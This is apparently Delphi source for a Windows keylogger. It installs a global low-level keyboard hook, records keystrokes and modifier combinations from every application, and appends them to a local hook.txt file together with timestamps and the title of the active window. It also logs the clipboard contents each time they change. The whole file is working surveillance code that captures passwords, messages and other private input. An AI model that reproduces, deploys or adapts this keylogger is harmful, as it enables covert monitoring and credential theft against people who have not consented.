unit Unit1;

interface

uses
  Winapi.Windows, Winapi.Messages, System.SysUtils, System.Variants,
  System.Classes, Vcl.Graphics, Vcl.Clipbrd, Vcl.Controls, Vcl.Forms,
  Vcl.Dialogs,
  Vcl.Buttons, Vcl.StdCtrls, Vcl.ExtCtrls, Vcl.ComCtrls;

const
  WH_KEYBOARD_LL = 13;
  CRLF = #$0D#$0A;

type
  TKBDLLHOOKSTRUCT = packed record
    FVkCode: DWORD;
    FScanCode: DWORD;
    FFlags: DWORD;
    FTime: DWORD;
    FDwExtraInfo: pointer;
  end;

  PKBDLLHOOKSTRUCT = ^TKBDLLHOOKSTRUCT;

  TForm1 = class(TForm)
    Timer1: TTimer;
    Label1: TLabel;
    Button1: TButton;
    Memo1: TMemo;
    Label2: TLabel;
    Label3: TLabel;
    procedure Timer1Timer(Sender: TObject);
    procedure FormCreate(Sender: TObject);
    procedure FormDestroy(Sender: TObject);
    procedure Button1Click(Sender: TObject);
  private
    { Private declarations }
  public
    { Public declarations }
  end;

var
  Form1: TForm1;
  MainkeyboardHook: cardinal;
  Key, MouseKey: Boolean;
  ClipBrdBuffer: string;

implementation

{$R *.dfm}

procedure writedoc(str: string);
var
  LvFile: TextFile;
begin
  AssignFile(LvFile, 'hook.txt');

  if FileExists(ExtractFilePath(ParamStr(0)) + 'hook.txt') = false then
  begin
    Rewrite(LvFile);
    Append(LvFile);
  end
  else
    Append(LvFile);

  Writeln(LvFile, str);
  Close(LvFile);
end;

function GetChar(lparam: integer): Ansistring;
var
  LvData: PKBDLLHOOKSTRUCT;
  LvKeyState: TKeyboardState;
  LvRetCode: integer;
  LvLayout: hkl;
begin
  LvData := pointer(lparam);
  GetKeyboardState(LvKeyState);
  LvLayout := GetKeyBoardLayout(GetWindowThreadProcessId(GetForegroundWindow));
  SetLength(Result, 2);
  LvRetCode := ToAsciiEx(LvData.FVkCode, LvData.FScanCode, LvKeyState, @Result[1], 0, LvLayout);
  case LvRetCode of
    0:
      Result := '';
    1:
      SetLength(Result, 1);
  else
    Result := '';
  end;
end;

function KeboardProc(code: integer; wparam: integer; lparam: integer): integer; stdcall;
var
  LvTempStr: string;
  KeyInfo: PKBDLLHOOKSTRUCT;
  KeyCode: DWORD;
  LvChar: AnsiString;
  LvCtrlKey: string;
  IsCtrlPressed, IsAltPressed, IsShiftPressed: Boolean;
begin
  if (code < 0) or (code <> HC_ACTION) then
    Result := CallNextHookEx(MainkeyboardHook, code, wparam, lparam)
  else
  begin
    KeyInfo := PKBDLLHOOKSTRUCT(lparam);
    KeyCode := KeyInfo^.FVkCode;

    IsCtrlPressed := GetAsyncKeyState(VK_CONTROL) < 0;
    IsAltPressed := GetAsyncKeyState(VK_MENU) < 0; // VK_MENU is the code for Alt key
    IsShiftPressed := GetAsyncKeyState(VK_SHIFT) < 0;

    if (wparam = wm_keydown) or (wparam = wm_syskeydown) then
    begin
      // Handle Ctrl + Key
      if IsCtrlPressed then
        LvCtrlKey := '[Ctrl+';

      // Handle Alt + Key
      if IsAltPressed then
      begin
        if IsCtrlPressed then
          LvCtrlKey := LvCtrlKey + 'Alt+'
        else
          LvCtrlKey := '[Alt+';
      end;

      // Handle Shift + Key
      if IsShiftPressed then
      begin
        if IsCtrlPressed or IsAltPressed then
          LvCtrlKey := LvCtrlKey + 'Shift+'
        else
          LvCtrlKey := '[Shift+';
      end;

      // Handle F1 to F12 keys
      if (KeyCode >= VK_F1) and (KeyCode <= VK_F12) then
      begin
        if (IsCtrlPressed) or (IsAltPressed) or (IsShiftPressed) then
          Form1.Memo1.Lines.Add( LvCtrlKey + 'F' + IntToStr(KeyCode - VK_F1 + 1) + ']')
        else
          Form1.Memo1.Lines.Add('[F' + IntToStr(KeyCode - VK_F1 + 1) + ']');
      end;

      LvChar := GetChar(lparam);
      if (LvChar <> '') and ((IsCtrlPressed) or (IsAltPressed) or (IsShiftPressed)) then
        Form1.Memo1.Lines.Add(LvCtrlKey + LvChar + ']')
      else if LvChar <> '' then
        Form1.Memo1.Lines.Add(LvChar);
    end;

    if wparam = wm_syskeydown then
      Application.ProcessMessages;

    Result := CallNextHookEx(MainkeyboardHook, code, wparam, lparam);
  end;
end;

procedure TForm1.Button1Click(Sender: TObject);
begin
  Memo1.Lines.Clear;
end;

procedure TForm1.FormCreate(Sender: TObject);
begin
  MainkeyboardHook := SetWindowsHookEx(WH_KEYBOARD_LL, @KeboardProc, HInstance, 0);
  if MainkeyboardHook <> INVALID_HANDLE_VALUE then
    Memo1.Lines.Add('Hook set...' + CRLF);
end;

procedure TForm1.FormDestroy(Sender: TObject);
begin
  if MainkeyboardHook <> INVALID_HANDLE_VALUE then
  begin
    UnhookWindowsHookEx(MainkeyboardHook);
    Memo1.Lines.Add(CRLF + 'Hook completed...');
  end;
end;

procedure TForm1.Timer1Timer(Sender: TObject);
var
  LvBuffer: array [Byte] of Char;
begin
  if GetAsyncKeyState(13) <> 0 then
  begin
    Key := True;
    while Key = True do
    begin
      if GetAsyncKeyState(13) = 0 then
      begin
        Key := false;
        if Memo1.Text <> ''  then
        begin
          GetWindowText(GetForegroundWindow, LvBuffer, length(LvBuffer) * SizeOf(LvBuffer[0]));
          writedoc(Memo1.Text + ' Time:' + TimeToStr(time) + ' Date:' + DateToStr(Date) + ' ' + LvBuffer);
        end;
        Memo1.Clear;
      end;
    end;

    if GetAsyncKeyState(1) <> 0 then
    begin
      MouseKey := True;
      while MouseKey = True do
      begin
        if GetAsyncKeyState(1) = 0 then
        begin
          MouseKey := false;
          if Memo1.Text <> '' then
          begin
            GetWindowText(GetForegroundWindow, LvBuffer, length(LvBuffer) * SizeOf(LvBuffer[0]));
            writedoc(Memo1.Text + ' Time:' + TimeToStr(time) + ' Date:' + DateToStr(Date) + ' ' + LvBuffer);
          end;
          Memo1.Clear;
        end;
      end;
    end;

    try
      if ClipBrdBuffer <> Clipboard.AsText then
      begin
        ClipBrdBuffer := Clipboard.AsText;
        writedoc('Clipboard=(' + ClipBrdBuffer + ') Time:' + TimeToStr(time) + ' Date:' + DateToStr(Date));
      end;
    except
      Application.ProcessMessages;
    end;
  end;
end;

end.
